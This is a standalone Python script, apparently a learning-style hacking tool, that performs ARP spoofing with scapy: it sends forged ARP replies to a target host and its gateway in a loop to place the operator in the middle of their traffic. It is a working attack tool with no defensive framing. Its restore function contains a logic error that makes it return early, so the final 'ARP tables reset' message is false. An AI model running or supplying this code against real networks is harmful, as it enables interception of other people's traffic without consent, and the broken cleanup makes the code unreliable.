#!/bin/bash

import scapy.all as scapy
import argparse
import time
import sys


def get_arguments():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('--target', dest="target_ip")
    arg_parser.add_argument('--gateway', dest="router_ip")
    user_input = arg_parser.parse_args()
    return user_input


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    (answered_list) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return


sent_packets = 0


def send_arp_packet(target_ip, spoof_ip):
    global sent_packets
    target_mac = get_mac(target_ip)
    if not target_mac or not target_ip:
        print("[-] WARNING: Could not get either target mac address or target ip address")
        print("[-] Quitting...")
        sys.exit()
    else:
        sent_packets += 1
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    if not destination_ip or source_ip:
        return
    else:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)


def execute_spoof():
    target_ip = get_arguments().target_ip
    gateway_ip = get_arguments().router_ip
    if not target_ip or not gateway_ip:
        print("[-] Error: Target ip or Gateway ip not specified")
        print("[-] Usage: --target, --gateway")
    elif target_ip and gateway_ip:
        try:
            while True:
                send_arp_packet(target_ip, gateway_ip)
                send_arp_packet(gateway_ip, target_ip)
                print("\r[+] Sent " + str(sent_packets) + " packets"),
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[+] Quitting...")
            restore(target_ip, gateway_ip)
            restore(gateway_ip, target_ip)
            print("[+] ARP tables reset.")
    else:
        print("[-] An unexpected error has occurred")


execute_spoof()
